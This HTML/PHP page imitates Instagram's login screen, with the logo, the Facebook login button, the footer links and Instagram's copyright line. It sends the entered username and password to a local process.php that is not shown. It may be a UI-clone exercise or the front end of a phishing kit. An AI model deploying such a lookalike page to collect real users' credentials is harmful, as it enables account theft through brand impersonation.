<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="./img/instagram-logo-16px.png">
    <link rel="stylesheet" href="./../css/shared/config.css?v=<?=time()?>">
    <link rel="stylesheet" href="./css/login.css?v=<?=time()?>">
    <title>Instagram</title>
</head>
<body>
    <div class="container">
        <main class="home-section">
            <div class="phone-display">
                <img src="./img/login-phone-background.jpg" alt="Instagram Login Background">
            </div>
            <div class="sign-in-wrapper">
                <form action="process.php" method="POST" class="sign-in-area">
                    <img src="./img/login-instagram-logo.png" alt="Instagram Logo">
                    <input type="text" name="username" placeholder="Username">
                    <input type="text" name="password" placeholder="Password">
                    <input type="submit" name="signin_btn" value="Log In">
                    <p class="login-area-or">OR</p>
                    <a href="#" class="facebook-login">
                        <img src="./img/facebook-logo.png" alt="Facebook Logo">
                        <p>Log in with Facebook</p>
                    </a>
                    <a class="forgot-password" href="#">Forgot password?</a>
                </form>
                <div class="sign-up-area">
                    <p>Don't have an account? <a href="./sign-up.php">Sign up</a></p>
                </div>
                <div class="get-app">
                    <p>Get the app.</p>
                    <div class="download">
                        <img src="./img/download-appstore.png" alt="App Store">
                        <img src="./img/download-playstore.png" alt="Play Store">
                    </div>
                </div>
            </div>
        </main>
        <div class="tags">
            <div class="support-tags">
                <a href="#">About</a>
                <a href="#">Blog</a>
                <a href="#">Jobs</a>
                <a href="#">Help</a>
                <a href="#">API</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
                <a href="#">Top Accounts</a>
                <a href="#">Hashtags</a>
                <a href="#">Locations</a>
                <a href="#">Instagram Lite</a>
            </div>
            <div class="content-tags">
                <a href="#">Beauty</a>
                <a href="#">Dance</a>
                <a href="#">Fitness</a>
                <a href="#">Food & Drink</a>
                <a href="#">Home & Garden</a>
                <a href="#">Music</a>
                <a href="#">Visual Arts</a>
            </div>
            <p class="copyright">© 2021 Instagram from Facebook</p>
        </div>
    </div>
</body>
</html>